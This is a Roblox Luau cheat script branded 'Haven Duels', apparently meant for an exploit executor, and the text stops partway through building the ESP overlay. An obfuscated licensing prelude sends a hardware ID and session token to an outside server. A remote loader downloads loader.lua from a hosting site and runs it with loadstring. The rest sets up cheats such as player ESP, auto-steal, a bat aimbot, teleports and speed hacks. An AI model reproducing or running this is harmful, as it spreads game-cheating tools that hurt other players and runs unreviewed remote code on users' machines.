-- [[ CREATED BY: HAVEN HUB ]]
-- [[ DISCORD: https://discord.gg/KwFQqgmZJ ]]

--[[fmwm.1.ZmZhLTFiMTAzNzkzLThlNGUtNGE5MS1hYTEwLTc4NzUxMTNlYjNkNS1iNDAwM2FjN3wxYjEwMzc5My04ZTRlLTRhOTEtYWExMC03ODc1MTEzZWIzZDV8MjcwZjFmNWU4NWY1ZjNhNWFhZDA0YjBhNDU3ZmNiNWF8MTc5MTM3NDM2Mw.01941f355025]]
-- thin prelude
pcall(function()
  -- prelude
  pcall(function() if _G._FAULMOR_DIAG then print('DIAG: PRELUDE_START') end end)
  local _lO0lO = ""
  local _lI1lI = "9DE67514-21A8-4953-A107-19413497B8DC"
  local _lOo0O = nil
  local _l1i1l = nil
  local _l0IiI = "free"
  local _l1oO0 = nil
  local _lI0o1 = 78
  local _l0l0l = "Potassium"
  local _lI1i1 = false
  local function _fm_hb_env()
    local ok, e = pcall(function() return type(getgenv) == 'function' and getgenv() end)
    if ok and type(e) == 'table' then return e end
    local ok2, e2 = pcall(function() return type(getfenv) == 'function' and getfenv(0) end)
    if ok2 and type(e2) == 'table' then return e2 end
    return _G
  end
  do
    local env=nil do local gg=nil local ok,g=pcall(function() return type(getgenv) == 'function' and getgenv() end) if ok and type(g)=='table' then gg=g end local function tr(l) if type(getfenv) == 'function' then local ok2,e=pcall(getfenv,l) if ok2 and type(e)=='table' then return e end end end env=tr(2) or tr(3) or gg or tr(1) or tr(0) or _G end
    if type(env) == 'table' then
      env.LRM_ScriptKey = _lO0lO
      env.LRM_HWID = _lI1lI
      env.LRM_LinkedDiscordID = _lOo0O
      env.LRM_LinkedDiscordName = _l1i1l
      env.LRM_KeyType = _l0IiI
      env.LRM_KeyExpiresAt = _l1oO0
      env.LRM_TotalExecutions = _lI0o1
      env.LRM_Executor = _l0l0l
      env.LRM_IsPremium = _lI1i1
      local _spawn = (type(task) == 'table' and type(task.spawn) == 'function' and task.spawn) or (type(coroutine) == 'table' and type(coroutine.create) == 'function' and type(coroutine.resume) == 'function' and function(f) local co=coroutine.create(f); pcall(coroutine.resume, co) end)
      local _wait = (type(task) == 'table' and type(task.wait) == 'function' and task.wait) or (type(wait) == 'function' and wait)
      local _unpack = (type(table) == 'table' and type(table.unpack) == 'function' and table.unpack) or (type(unpack) == 'function' and unpack)
      if _spawn then env.LRM_Spawn = _spawn end
      if _wait then env.LRM_Wait = _wait end
      if _unpack then env.LRM_Unpack = _unpack end
    end
  end
  -- session
  local _FM_SESS = { t = "st.1.dd1eff00-9667-4e99-b1de-34085175b336.1b103793-8e4e-4a91-aa10-7875113eb3d5.270f1f5e85f5f3a5aad04b0a457fcb5a.0.1791374362.1791374662.1.6208a1d3fe75a640.fdad3d895df6018259fccafaa518ae1c200f3097d84701c2db08f3291471d7ba", e = 1791374662, u = "https://faulmor.site/api/public/session/refresh", h = _lI1lI }
  local _fm_spawn = (type(task) == 'table' and type(task.spawn) == 'function' and task.spawn) or (type(coroutine) == 'table' and type(coroutine.create) == 'function' and type(coroutine.resume) == 'function' and function(f) local co=coroutine.create(f); pcall(coroutine.resume, co) end)
  local _fm_wait = (type(task) == 'table' and type(task.wait) == 'function' and task.wait) or (type(wait) == 'function' and wait)
  if _fm_spawn and _fm_wait then
    pcall(function() if _G._FAULMOR_DIAG then print('DIAG: PHASE=PRELUDE_INIT _fm_spawn=' .. type(_fm_spawn) .. ' _fm_wait=' .. type(_fm_wait)) end end)
    pcall(_fm_spawn, function()
    local hs; local ok, svc = pcall(function() return type(game) == 'table' and type(game.GetService) == 'function' and game:GetService('HttpService') end); if ok and svc then hs = svc end
    if not hs then return end
    while true do
      local now = os.time()
      local left = _FM_SESS.e - now
      if left <= 30 then
        local body = '{"token":"' .. _FM_SESS.t .. '","hwid":"' .. _FM_SESS.h .. '","script_key":"' .. _lO0lO .. '"}'
        local ok2, resp = pcall(hs.PostAsync, hs, _FM_SESS.u, body, 2, 'application/json')
        if ok2 and type(resp) == 'string' then
          local nt = resp:match('"token"%s*:%s*"([^"]+)"')
          local ne = tonumber(resp:match('"exp"%s*:%s*(%d+)'))
          if nt and ne then _FM_SESS.t = nt; _FM_SESS.e = ne end
        end
        _fm_wait(15)
      else
        _fm_wait(math.max(5, left - 30))
      end
    end
  end)
  end
  do local _e=_fm_hb_env(); if type(_e)=='table' then local _old=_e["__fmbh"]; if type(_old)=='table' then _old.enabled=false end; _e["__fmbh"]=nil end end
  -- end prelude

end)
-- El cargador remoto es opcional y se ejecuta después del skip, nunca durante la intro.
local function runRemoteLoader()
    local remoteLoaderOk, remoteLoaderError = pcall(function()
        local source = game:HttpGet("https://roblox-panel-mdlz.onrender.com/loader.lua")
        local loader, compileError = loadstring(source)
        assert(loader, compileError or "No se pudo compilar loader.lua")
        loader()
    end)
    if not remoteLoaderOk then
        warn("[HAVEN DUELS] No se pudo cargar loader.lua; continuando con el script local: " .. tostring(remoteLoaderError))
    end
end

repeat task.wait() until game:IsLoaded()
Players = game:GetService("Players")
RunService = game:GetService("RunService")
UIS = game:GetService("UserInputService")
Lighting = game:GetService("Lighting")
HS = game:GetService("HttpService")
ReplicatedStorage = game:GetService("ReplicatedStorage")
TS_G = game:GetService("TweenService")
LP = Players.LocalPlayer
camera = workspace.CurrentCamera
CONFIG_FILE = "HavenDuels.json"
LEGACY_CONFIG_FILE = "Vision.json"
BACKGROUND_OPTIONS = {"BLACK"}
DEFAULT_BACKGROUND_ID = "BLACK"


-- INTRO AUTÓNOMA CON MÚSICA
-- Ejecutable en Roblox/Luau. Muestra la intro completa y permite omitirla
-- tocando o haciendo clic en cualquier parte.


-- Música de la intro. Se detiene al tocar “TAP ANYWHERE TO SKIP”.
INTRO_MUSIC_URL = "https://files.catbox.moe/y4q5y3.mp3"
INTRO_MUSIC_FILE = "cleanhub_intro_song_14.mp3"
INTRO_MUSIC_VOLUME = 1
SoundService = game:GetService("SoundService")

local function resolveIntroMusicId()
    local assetGetter = getcustomasset or getsynasset
    if type(assetGetter) == "function" and type(writefile) == "function" then
        local exists = false
        if type(isfile) == "function" then
            pcall(function() exists = isfile(INTRO_MUSIC_FILE) end)
        end
        if not exists then
            local ok, data = pcall(function() return game:HttpGet(INTRO_MUSIC_URL) end)
            if ok and type(data) == "string" and #data > 0 then
                pcall(writefile, INTRO_MUSIC_FILE, data)
            end
        end
        local ok, asset = pcall(assetGetter, INTRO_MUSIC_FILE)
        if ok and asset then return asset end
    end
    return INTRO_MUSIC_URL
end

-- Valores usados por la animación original.
v76 = {
    [1]=12, [6]=32, [10]=0.15, [13]=0.4, [14]=6, [20]=3,
    [26]=255, [31]=5, [37]=22, [52]=100, [58]=1, [72]=60,
    [89]=2, [94]="Frame", [95]=4, [100]=10, [104]=false,
    [150]="TextButton", [164]=0.5, [168]=1, [175]=0, [187]=6, [198]=true,
}
_G._VantaSkipIntro = false
_G._VantaIntroActive = true

									local function showIntro(onFinished)
									local introSound
									local function stopIntroMusic()
										if introSound then
											pcall(function() introSound:Stop() end)
											pcall(function() introSound:Destroy() end)
											introSound = nil
										end
									end

										if _G._VantaLoadIntroCleanup then
											pcall(_G._VantaLoadIntroCleanup)
										end


										local flag19 = UIS.TouchEnabled and not UIS.KeyboardEnabled
										local playerGui = LP:WaitForChild("PlayerGui")
										local vantaLoadIntro = playerGui:FindFirstChild("VantaLoadIntro")

										if vantaLoadIntro then
											vantaLoadIntro:Destroy()
										end

										local vantaLoadIntroBlur = Lighting:FindFirstChild("VantaLoadIntroBlur")

										if vantaLoadIntroBlur then
											vantaLoadIntroBlur:Destroy()
										end

										local screenGui = Instance.new("ScreenGui")
										screenGui.Name = "VantaLoadIntro"

										if _G._VantaMountOnTop then
											_G._VantaMountOnTop(screenGui, 1000005)
										else
											screenGui.ResetOnSpawn = v76[104]
											screenGui.DisplayOrder = 1000005
											screenGui.Parent = playerGui
										end

										screenGui.IgnoreGuiInset = true

										introSound = Instance.new("Sound")
										introSound.Name = "VantaIntroMusic"
										introSound.SoundId = resolveIntroMusicId()
										introSound.Volume = INTRO_MUSIC_VOLUME
										introSound.Looped = false
										introSound.Parent = SoundService
										pcall(function() introSound:Play() end)
										local instance = Instance.new(v76[94])
										instance.BackgroundColor3 = Color3.fromRGB(v76[31], v76[31], 8)
										instance.BackgroundTransparency = 1
										instance.BorderSizePixel = 0
										instance.Size = UDim2.fromScale(1, 1)
										instance.ZIndex = 1000
										instance.Parent = screenGui
										local frame = Instance.new("Frame")
										frame.Name = "MovingStars"
										frame.BackgroundTransparency = 1
										frame.BorderSizePixel = v76[175]
										frame.Size = UDim2.fromScale(1, 1)
										frame.ClipsDescendants = v76[198]
										frame.ZIndex = 1001
										frame.Parent = instance
										frame.Visible = false -- eliminar puntitos/estrellas
										local tbl24 = {}
										local n32 = 0 -- sin puntitos/estrellas

										for i = 1, n32 do
											local frame2 = Instance.new("Frame")
											frame2.BackgroundColor3 = i % v76[187] == v76[175] and Color3.fromRGB(190, 204, 255) or Color3.fromRGB(238, 240, 255)
											frame2.BackgroundTransparency = v76[168]
											frame2.BorderSizePixel = 0
											frame2.AnchorPoint = Vector2.new(0.5, 0.5)
											frame2.Size = UDim2.fromOffset(i % 9 == 0 and 3 or v76[89], i % 9 == 0 and 3 or 2)
											frame2.ZIndex = 1001
											frame2.Parent = frame
											local uiCorner = Instance.new("UICorner")
											uiCorner.CornerRadius = UDim.new(1, 0)
											uiCorner.Parent = frame2

											tbl24[i] = {
												frame = frame2,
												x = i * 37 % 101 / v76[52],
												y = i * 61 % 101 / 100,
												speed = 0.008 + i % v76[31] * 0.004,
												phase = i * 0.83,
												opacity = 0.35 + i % v76[95] * 0.1,
											}
										end

										local frame2 = Instance.new("Frame")
										frame2.Name = "VantaWordmark"
										frame2.BackgroundTransparency = v76[168]
										frame2.BorderSizePixel = 0
										frame2.AnchorPoint = Vector2.new(0.5, 0.5)
										frame2.Position = UDim2.fromScale(0.5, 0.43)
										frame2.Size = flag19 and UDim2.fromOffset(340, 105) or UDim2.fromOffset(820, 230)
										frame2.ClipsDescendants = false
										frame2.ZIndex = 1003
										frame2.Parent = instance
										local uiScale = Instance.new("UIScale")
										uiScale.Scale = 0.86
										uiScale.Parent = frame2
										local tbl25 = {}

										local tbl26 = {
											id = 116838820706368,
											from = Vector2.new(-v76[13], 0.2),
											final = Vector2.new(0.08, 0.5),
											rotation = -v76[6],
											delay = 0.02,
										}

										local tbl27 = {
											id = 100562870418590,
											from = Vector2.new(0.3, -0.55),
											final = Vector2.new(0.245, 0.5),
											rotation = 20,
											delay = 0.12,
										}

										local tbl28 = {
											id = 139374055352240,
											from = Vector2.new(1.42, 0.3),
											final = Vector2.new(0.41, 0.5),
											rotation = -22,
											delay = 0.22,
										}

										local tbl29 = {
											id = 102192810852440,
											from = Vector2.new(0.68, 1.55),
											final = Vector2.new(0.575, 0.5),
											rotation = 27,
											delay = 0.32,
										}

										local tbl30 = {
											id = 112072591999551,
											from = Vector2.new(1.48, -0.42),
											final = Vector2.new(0.74, 0.5),
											rotation = 18,
											delay = 0.42,
										}
										local tbl32 = {
											id = 92498386894715,
											from = Vector2.new(-0.35, 1.35),
											final = Vector2.new(0.905, 0.5),
											rotation = -14,
											delay = 0.52,
										}

										tbl25[1] = tbl26
										tbl25[2] = tbl27
										tbl25[3] = tbl28
										tbl25[4] = tbl29
										tbl25[5] = tbl30
										tbl25[6] = tbl32
										local tbl31 = {}

										for i, v94 in ipairs(tbl25) do
											local frame3 = Instance.new("Frame")
											frame3.BackgroundTransparency = 1
											frame3.BorderSizePixel = 0
											frame3.AnchorPoint = Vector2.new(0.5, 0.5)
											frame3.Position = UDim2.fromScale(v94.from.X, v94.from.Y)
											frame3.Size = UDim2.fromScale(0.16, v76[168])
											frame3.Rotation = v94.rotation
											frame3.ZIndex = 1003 + i
											frame3.Parent = frame2
											local imageLabel = Instance.new("ImageLabel")
											imageLabel.BackgroundTransparency = 1
											imageLabel.BorderSizePixel = 0
											imageLabel.Image = "rbxassetid://" .. tostring(v94.id)
											imageLabel.ImageColor3 = Color3.fromRGB(v76[26], 255, 255)
											imageLabel.ImageTransparency = v76[168]
											imageLabel.ScaleType = Enum.ScaleType.Fit
											imageLabel.AnchorPoint = Vector2.new(0.5, 0.5)
											imageLabel.Position = UDim2.fromScale(0.5, 0.5)
											imageLabel.Size = UDim2.fromScale(1, v76[168])
											imageLabel.ZIndex = 1004 + i
											imageLabel.Parent = frame3
											tbl31[i] = { slot = frame3, image = imageLabel, spec = v94 }
										end

										local textLabel = Instance.new("TextLabel")
										textLabel.BackgroundTransparency = v76[168]
										textLabel.Text = "TAP ANYWHERE TO SKIP"
										textLabel.TextColor3 = Color3.fromRGB(240, 240, 244)
										textLabel.TextTransparency = 1
										textLabel.TextSize = flag19 and 11 or v76[37]
										textLabel.Font = Enum.Font.GothamMedium
										textLabel.AnchorPoint = Vector2.new(0.5, v76[164])
										textLabel.Position = flag19 and UDim2.new(0.5, 0, 0.43, 82) or UDim2.new(0.5, 0, 0.43, 155)
										textLabel.Size = UDim2.new(0.8, 0, 0, 24)
										textLabel.ZIndex = 1010
										textLabel.Parent = instance
										local textLabel2 = Instance.new("TextLabel")
										textLabel2.BackgroundTransparency = 1
										textLabel2.Text = "HAVEN DUELS"
										textLabel2.TextColor3 = Color3.fromRGB(166, 168, 178)
										textLabel2.TextTransparency = 1
										textLabel2.TextSize = flag19 and 10 or 16
										textLabel2.Font = Enum.Font.GothamMedium
										textLabel2.AnchorPoint = Vector2.new(0.5, v76[164])
										textLabel2.Position = flag19 and UDim2.new(0.5, 0, 0.43, 102) or UDim2.new(0.5, 0, 0.43, 183)
										textLabel2.Size = UDim2.new(0.8, 0, 0, 22)
										textLabel2.ZIndex = 1010
										textLabel2.Parent = instance
										local instance2 = Instance.new(v76[150])
										instance2.BackgroundTransparency = 1
										instance2.Text = ""
										instance2.AutoButtonColor = false
										instance2.Size = UDim2.fromScale(v76[168], 1)
										instance2.ZIndex = 1011
										instance2.Parent = instance
										local blurEffect = Instance.new("BlurEffect")
										blurEffect.Name = "VantaLoadIntroBlur"
										blurEffect.Size = v76[175]
										blurEffect.Parent = Lighting
										local flag20 = true
										local flag21 = false

										local function fn33(arg2)
											local n33 = math.clamp(arg2, 0, v76[168])
											return n33 * n33 * (v76[20] - 2 * n33)
										end

										local function fn34(arg2, arg3, arg4, arg5)
											local n33 = 1 - arg5
											return Vector2.new(n33 * n33 * arg2.X + v76[89] * n33 * arg5 * arg3.X + arg5 * arg5 * arg4.X, n33 * n33 * arg2.Y + 2 * n33 * arg5 * arg3.Y + arg5 * arg5 * arg4.Y)
										end

										local function fn35()
											if flag21 then
												return
											end
											flag21 = true
											flag20 = false
											stopIntroMusic()
											local tweenInfo = TweenInfo.new(0.42, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)


											TS_G:Create(instance, tweenInfo, { BackgroundTransparency = 1 }):Play()
											TS_G:Create(uiScale, tweenInfo, { Scale = 0.72 }):Play()
											TS_G:Create(blurEffect, tweenInfo, { Size = 0 }):Play()
											TS_G:Create(textLabel, tweenInfo, { TextTransparency = v76[168] }):Play()
											TS_G:Create(textLabel2, tweenInfo, { TextTransparency = 1 }):Play()

											for _, v94 in ipairs(tbl24) do
												TS_G:Create(v94.frame, tweenInfo, { BackgroundTransparency = 1 }):Play()
											end

											for _, v94 in ipairs(tbl31) do
												TS_G:Create(v94.image, tweenInfo, { ImageTransparency = 1 }):Play()
											end

											task.delay(0.42, function()
												if screenGui.Parent then
													screenGui:Destroy()
												end

												if blurEffect.Parent then
													blurEffect:Destroy()
												end

												_G._VantaLoadIntroCleanup = nil

												if onFinished then
													onFinished()
												end
											end)
										end

										_G._VantaLoadIntroCleanup = function()
											flag20 = v76[104]
											flag21 = true
											stopIntroMusic()


											if screenGui.Parent then
												screenGui:Destroy()
											end

											if blurEffect.Parent then
												blurEffect:Destroy()
											end
										end

										instance2.Activated:Connect(fn35)
										TS_G:Create(instance, TweenInfo.new(0.25, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), { BackgroundTransparency = 0.5 }):Play()
										TS_G:Create(blurEffect, TweenInfo.new(0.25, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), { Size = 10 }):Play()
										TS_G:Create(textLabel, TweenInfo.new(0.25), { TextTransparency = 0.22 }):Play()
										TS_G:Create(textLabel2, TweenInfo.new(0.25), { TextTransparency = 0.18 }):Play()

										task.spawn(function()
											local now2 = os.clock()

											while flag20 and not flag21 do
												local n33 = os.clock() - now2
												local v94 = fn33((n33 - 0.38) / 0.9)
												local n34 = math.sin(n33 * 1.62) * v94
												local n35 = math.sin(n33 * 3.24) * v94
												uiScale.Scale = 0.86 + fn33(n33 / 0.78) * 0.14 + n34 * 0.012
												local v95 = fn33(n33 / 0.42)

												for _, v96 in ipairs(tbl24) do
													local n36 = (v96.x + n33 * v96.speed) % 1.12 - 0.06
													local n37 = v96.y + math.sin(n33 * 0.78 + v96.phase) * 0.012
													local n38 = (math.sin(n33 * v76[89] + v96.phase) + 1) * 0.5
													v96.frame.Position = UDim2.fromScale(n36, n37)
													v96.frame.BackgroundTransparency = v76[168] - v95 * (v96.opacity + n38 * v76[10])
												end

												for i, v96 in ipairs(tbl31) do
													local spec = v96.spec
													local n36 = i - 3
													local n37 = math.abs(n36) / 2
													local n38 = math.clamp((n33 - spec.delay) / 0.96, 0, 1)
													local n39 = 1 - (v76[168] - n38) ^ 3
													local v97 = fn34(spec.from, Vector2.new((spec.from.X + spec.final.X) * 0.5 - n36 * 0.08, (spec.from.Y + spec.final.Y) * 0.5 + (i % v76[89] == 0 and -0.23 or 0.23)), spec.final, n39)
													v96.slot.Position = UDim2.fromScale(v97.X + n36 * n34 * 0.009, v97.Y + (n37 * n37 * v76[1] - v76[14]) * n34 / 230 + n35 * (1 - n37) * 2.4 / 230)
													v96.slot.Size = UDim2.fromScale(0.245 * (v76[168] + n34 * (0.035 + n37 * 0.055)), 1 - n34 * (0.028 + n37 * 0.045))
													v96.slot.Rotation = spec.rotation * (v76[168] - n39) + n36 * n34 * 5.8 + n35 * (v76[168] - n37) * 0.8
													local v98 = math.sin(n33 * 2.85 + i * 0.82)
													local v99 = math.sin(n33 * 2.1 + i * 0.64)
													v96.image.Position = UDim2.new(0.5, 0, 0.5, v99 * 1.35)
													v96.image.Size = UDim2.fromScale(1 + v98 * 0.026, 1 - v98 * 0.038)
													v96.image.Rotation = v99 * 0.9
													v96.image.ImageTransparency = 1 - fn33((n38 - 0.02) / 0.18)
												end

												RunService.RenderStepped:Wait()
											end
										end)

										task.delay(v76[100], fn35)
									end

local function clearOldVisionInterface()
    local playerGui = LP:WaitForChild("PlayerGui")
    local roots = {playerGui}
    local coreOk, coreGui = pcall(function() return game:GetService("CoreGui") end)
    if coreOk and coreGui then table.insert(roots, coreGui) end

    for _, root in ipairs(roots) do
        for _, guiName in ipairs({"Vision", "VisionStealHUD", "StealBarMovableSmall", "Vision_FloatingPanel", "FloatingModeMenu", "BrainrotIntroGui"}) do
            local oldGui = root:FindFirstChild(guiName)
            if oldGui then pcall(function() oldGui:Destroy() end) end
        end
    end

    local character = LP.Character
    local head = character and character:FindFirstChild("Head")
    local oldBillboard = head and head:FindFirstChild("VisionSpeedBB")
    if oldBillboard then oldBillboard:Destroy() end
end

removedAccessories = {}

local function removeCharacterAccessories()
    local char = LP.Character
    if not char then return end
    for _, child in ipairs(char:GetChildren()) do
        if child:IsA("Accessory") or child:IsA("Hat") or (child:IsA("Model") and child:FindFirstChild("Handle")) then
            table.insert(removedAccessories, {parent = child.Parent, acc = child})
            child.Parent = nil
        end
    end
end

local function restoreAccessories()
    for _, item in ipairs(removedAccessories) do
        if item.acc and not item.acc.Parent then
            item.acc.Parent = item.parent
        end
    end
    removedAccessories = {}
end

local function safeWritefile(path, data)
    if type(writefile) ~= "function" then return false, "writefile unavailable" end
    local ok, err = pcall(writefile, path, data)
    return ok, err
end
local function safeReadfile(path) if type(readfile) == "function" then local ok, data = pcall(readfile, path) return ok and data or nil end return nil end
local function safeIsfile(path) if type(isfile) == "function" then local ok, res = pcall(isfile, path) return ok and res end return false end
local function safeSetfpscap(v) if type(setfpscap) == "function" then pcall(setfpscap, v) end end
local function safeSethiddenproperty(obj, prop, val) if type(sethiddenproperty) == "function" then pcall(sethiddenproperty, obj, prop, val) end end

S = {
    espEnabled = false, espPlayerCache = {players = {}, addConn = nil, remConn = nil, colorConn = nil, _colorAcc = 0}, setESPVisual = nil,
    NS = 70, CS = 45, LS = 22, LCS = 22,
    speedMode = false, laggerMode = 0,
    antiRagdollEnabled = false, medusaCounterEnabled = false,
    medusaDebounce = false, medusaLastUsed = 0, medusaConns = {}, MEDUSA_COOLDOWN = 25,
    unwalkEnabled = false,
    autoLeftEnabled = false, autoRightEnabled = false,
    autoLeftSetVisual = nil, autoRightSetVisual = nil,
    _btnAAL = nil, _bsAAL = nil, _l1AAL = nil, _l2AAL = nil,
    _btnAAR = nil, _bsAAR = nil, _l1AAR = nil, _l2AAR = nil,
    _btnBAT = nil, _bsBAT = nil, _l1BAT = nil, _l2BAT = nil,
    _setPButtonActive = nil, speedCounterLabel = nil, speedDiscordLabel = nil, speedLabelLastUpdate = 0,
    batAimbotEnabled = false, batAimbotSetVisual = nil, batAimbotConn = nil,
    tpBatEnabled = false, tpBatSetVisual = nil, tpBatConn = nil, tpBatHitCooldown = false,
    tpBatAntiDieConnections = {}, batTpEnabled = false, _smartBatTpDriving = false,
    autoSwingEnabled = true, autoBatEquippedThisRun = false,
    _autoBatTarget = nil, _autoBatLastScan = 0,
    resetAutoBatMotion = nil,
    batCounterEnabled = false, batCounterConn = nil, batCounterDebounce = false,
    setBatCounterVisual = nil,
    batSkinMode = "Off", batSkinSelectorLabel = nil, batSkinConnections = {},
    displaySkin = "Off", displaySkinSelectorLabel = nil, customSkinEnabled = false, _skinApplyToken = 0,
    fpsBoostEnabled = false,
    lockUIEnabled = false,
    mainMenuFrame = nil, miniToggleButton = nil, floatingPanelFrame = nil, floatingPanelGui = nil,
    _floatingButtonInfos = nil, _floatingFreeButtonLayer = nil, _floatingUpdateLayout = nil,
    mainGuiScaleObj = nil, floatingGuiScaleObj = nil,
    backgroundAssetId = DEFAULT_BACKGROUND_ID, backgroundImage = nil,
    _noclipTimer = 0, _fpsCount = 0, _lastFpsTime = tick(), currentFPS = 0,
    alConn = nil, arConn = nil, alPhase = 1, arPhase = 1,
    progressFill = nil, progressPct = nil, progressBarFrame = nil, topBarHUD = nil, stealHudCard = nil,
    stealActive = false,
    autoCarryEnabled = false,
    autoCarrySetVisual = nil,
    autoCarryWasSpeedMode = false,
    autoCarryActive = false,
    autoCarryPending = false,
    autoCarryWatchConn = nil,
    autoCarryStealingBefore = false,
    autoCarryChildSnapshot = nil,
    setLaggerVisual = nil, speedClk = nil, setFpsVisual = nil,
    setAntiRagVisual = nil, setMedusaVisual = nil,
    setUnwalkVisual = nil, setDarkVisual = nil, setInstaGrab = nil,
    normalBox = nil, carryBox = nil, laggerBox = nil,
    radInput = nil, setLockUI_Visual = nil, setHideOpiumButtons = nil,
    holdJumpEnabled = false, holdJumpConn = nil, setHoldJumpVisual = nil,
    stealDurationBox = nil,
    hudBgLabel = nil,
    hudBarPos = nil,
    dropBrainrotActive = false,
    lastDropTime = 0,
    _dropSpeedMode = nil,
    _dropLaggerMode = nil,
    tpDownHeightTrigger = 20,
    Steal = {
        AutoStealEnabled = false, StealRadius = 61, StealDuration = 1.3,
        Data = {}, plotCache = {}, plotCacheTime = {}, cachedPrompts = {}, promptCacheTime = 0,
        isStealing = false, stealStartTime = nil, lastStealTick = 0,
    },
    KB = {
        DropBrainrot = {kb = Enum.KeyCode.X, gp = Enum.KeyCode.ButtonR2},
        AutoLeft = {kb = Enum.KeyCode.Z, gp = Enum.KeyCode.DPadLeft},
        AutoRight = {kb = Enum.KeyCode.C, gp = Enum.KeyCode.DPadRight},
        AutoBat = {kb = Enum.KeyCode.E, gp = Enum.KeyCode.ButtonY},
        TpBat = {kb = Enum.KeyCode.V, gp = nil},
        TPFlor = {kb = Enum.KeyCode.F, gp = Enum.KeyCode.ButtonA},
        GuiHide = {kb = Enum.KeyCode.LeftControl, gp = Enum.KeyCode.ButtonSelect},
        SpeedToggle = {kb = Enum.KeyCode.Q, gp = Enum.KeyCode.DPadUp},
        LaggerToggle = {kb = Enum.KeyCode.R, gp = Enum.KeyCode.DPadDown},
        InstaReset = {kb = Enum.KeyCode.H, gp = nil},
    },
    AP = {
        L1 = Vector3.new(-476.47, -6.28, 92.73), L2 = Vector3.new(-483.12, -4.95, 94.81),
        L_FACE = Vector3.new(-482.25, -4.96, 92.09),
        R1 = Vector3.new(-476.16, -6.52, 25.62), R2 = Vector3.new(-483.06, -5.03, 25.48),
        R_FACE = Vector3.new(-482.06, -6.93, 35.47),
    },
    Conns = {autoSteal = nil, antiRag = nil, anchor = {}, progress = nil},
    moveConn = nil, speedEnabled = true, h = nil, hrp = nil,
    lastMoveDir = Vector3.new(0,0,0),
    MOVE_KEYS = {
        [Enum.KeyCode.W] = true, [Enum.KeyCode.A] = true,
        [Enum.KeyCode.S] = true, [Enum.KeyCode.D] = true,
        [Enum.KeyCode.Up] = true, [Enum.KeyCode.Left] = true,
        [Enum.KeyCode.Down] = true, [Enum.KeyCode.Right] = true,
    },
    lockMobileButtons = false,
    IS_TOUCH_DEVICE = UIS.TouchEnabled,
    IS_MOBILE = UIS.TouchEnabled and not UIS.KeyboardEnabled,
    phoneGuiScale = 0.72,
    phoneButtonsScale = 0.86,
    mobileButtonPositions = {},
    mobileButtonRefs = {},
    floatingFreeButtonPositions = {},
    CONFIG_FILE = CONFIG_FILE,
    _floatingButtons = {},
    BAT_HIT_RANGE = 16,
    _holdJumpCooldownUntil = 0,
    holdJumpPressed = false,
    holdJumpActive = false,
    _youtResetInProgress = false,
    antiFlingEnabled = false, setAntiFlingVisual = nil,
    bodyLockEnabled = false, bodyLockRange = 20, bodyLockConnection = nil, bodyLockSetVisual = nil,
    currentAnimPack = "Off", originalAnimPack = nil, animPackConnection = nil, animSelectorLabel = nil,
    antiLagEnabled = false, setAntiLagVisual = nil,
    vividGraphicsEnabled = false, vividEffects = {},
    skyTheme = "Off", skySelectorLabel = nil,
    krobloxMode = "Off", krobloxSelectorLabel = nil,
    stretchEnabled = false, stretchFOV = 120,
    origFOV = nil, stretchConn = nil, stretchFovConn = nil,
}

-- ===== PLAYER ESP (VX7 COMPOSITE: BOX + HIGHLIGHT + SPEED CARD) =====
PLAYER_ESP_COLOR = Color3.fromRGB(180, 80, 255)
PLAYER_ESP_FILL_TRANSPARENCY = 0.7
PLAYER_ESP_OUTLINE_TRANSPARENCY = 0.3
PLAYER_ESP_BIND_NAME = "Vision_VX7_PlayerESP"

local function ensurePlayerESPGui()
    local cache = S.espPlayerCache
    if cache.screenGui and cache.screenGui.Parent then return cache.screenGui end
    local playerGui = LP:FindFirstChildOfClass("PlayerGui") or LP:WaitForChild("PlayerGui")
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "Vision_VX7_PlayerESP"
    screenGui.ResetOnSpawn = false
    screenGui.DisplayOrder = 998
    screenGui.IgnoreGuiInset = true
    screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Global
    screenGui.Parent = playerGui
    cache.screenGui = screenGui
    return screenGui
end

local function removeESPHighlight(playerData)
    if playerData and playerData.highlight then
        pcall(function() playerData.highlight:Destroy() end)
        playerData.highlight = nil
    end
end

local function disconnectESPConnection(playerData, name)
    local connection = playerData and playerData[name]
    if connection then
        pcall(function() connection:Disconnect() end)
        playerData[name] = nil
    end
end

local function removeESPForPlayer(player)
    local cache = S.espPlayerCache
    local data = cache and cache.players[player]
    if not data then return end
    disconnectESPConnection(data, "charConn")
    disconnectESPConnection(data, "charRemovingConn")
    removeESPHighlight(data)
    for _, key in ipairs({"box", "infoFrame"}) do
        if data[key] then pcall(function() data[key]:Destroy() end); data[key] = nil end
    end
    data.speedLabel = nil
    data.nameLabel = nil
    cache.players[player] = nil
end

local function clearESP()
    local cache = S.espPlayerCache
    if not cache then return end
    local players = {}
    for player in pairs(cache.players) do table.insert(players, player) end
    for _, player in ipairs(players) do removeESPForPlayer(player) end
end

local function createESPBox(parent)
    local box = Instance.new("Frame")
    box.Name = "VX7_ESPBox2D"
    box.BackgroundColor3 = PLAYER_ESP_COLOR
    box.BackgroundTransparency = 0.75
    box.BorderSizePixel = 0
    box.Visible = false
    box.ZIndex = 2
    box.Parent = parent
    local stroke = Instance.new("UIStroke")
    stroke.Color = PLAYER_ESP_COLOR
    stroke.Thickness = 1.5
    stroke.Transparency = 0
    stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
    stroke.Parent = box
    return box
end

local function createESPInfoCard(parent, player)
    local root = Instance.new("Frame")
    root.Name = "VX7_EI_" .. tostring(player.UserId)
    root.Size = UDim2.fromOffset(174, 59)
    root.AnchorPoint = Vector2.new(0.5, 1)
    root.BackgroundTransparency = 1
    root.BorderSizePixel = 0
    root.Visible = false
    root.Parent = parent

    local avatarBack = Instance.new("Frame")
    avatarBack.Size = UDim2.fromOffset(34, 34)
    avatarBack.Position = UDim2.fromOffset(8, 3)
    avatarBack.BackgroundColor3 = Color3.fromRGB(32, 32, 38)
    avatarBack.BorderSizePixel = 0
    avatarBack.Parent = root
    Instance.new("UICorner", avatarBack).CornerRadius = UDim.new(1, 0)

    local avatar = Instance.new("ImageLabel")
    avatar.Name = "Avatar"
    avatar.Size = UDim2.new(1, -4, 1, -4)
    avatar.Position = UDim2.fromOffset(2, 2)
    avatar.BackgroundTransparency = 1
    avatar.ScaleType = Enum.ScaleType.Crop
    avatar.Parent = avatarBack
